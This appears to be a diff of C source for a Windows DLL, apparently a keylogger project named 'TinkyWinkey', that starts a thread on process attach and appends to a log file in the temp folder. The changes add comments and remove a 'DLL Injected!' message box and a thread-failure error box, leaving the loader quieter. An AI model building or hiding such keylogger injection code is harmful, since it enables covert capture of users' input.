@@ -9,13 +9,13 @@ DWORD WINAPI ThreadFunc(LPVOID lpParam)
 	wchar_t tmpPath[MAX_PATH];
 
 	GetTempPathW(MAX_PATH, tmpPath);
-	wcscat_s(tmpPath, MAX_PATH, L"logs.txt");
+	wcscat_s(tmpPath, MAX_PATH, L"logs.txt"); // Create a temporary file path
 
 	fd = CreateFileW(tmpPath, GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE,
 		NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
 
 	if (fd != INVALID_HANDLE_VALUE)
-		SetFilePointer(fd, 0, NULL, FILE_END);
+		SetFilePointer(fd, 0, NULL, FILE_END); // Move to the end of the file
 	else
 		return 1;
 	write_to_file("TinkyWinkey started, getting system information...\n");
@@ -56,27 +56,10 @@ BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserv
 
 	if (ul_reason_for_call == DLL_PROCESS_ATTACH)
 	{
-		DisableThreadLibraryCalls(hModule);
-		HANDLE hThread = CreateThread(NULL, 0, ThreadFunc, NULL, 0, NULL);
-		if (!hThread)
-		{
-			MessageBoxA(NULL, "Failed to create thread", "Error", MB_OK | MB_ICONERROR);
-		}
-		else
-		{
+		DisableThreadLibraryCalls(hModule); // Prevent DLL_THREAD_ATTACH and DLL_THREAD_DETACH calls
+		HANDLE hThread = CreateThread(NULL, 0, ThreadFunc, NULL, 0, NULL); // Create a new thread to run the keylogger
+		if (hThread)
 			CloseHandle(hThread);
-		}
 	}
 	return TRUE;
 }
-
-// BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
-// {
-// 	(void)hModule;
-// 	(void)lpReserved;
-//     if (ul_reason_for_call == DLL_PROCESS_ATTACH)
-//     {
-//         MessageBoxA(NULL, "DLL Injected!", "Info", MB_OK);
-//     }
-//     return TRUE;
-// }
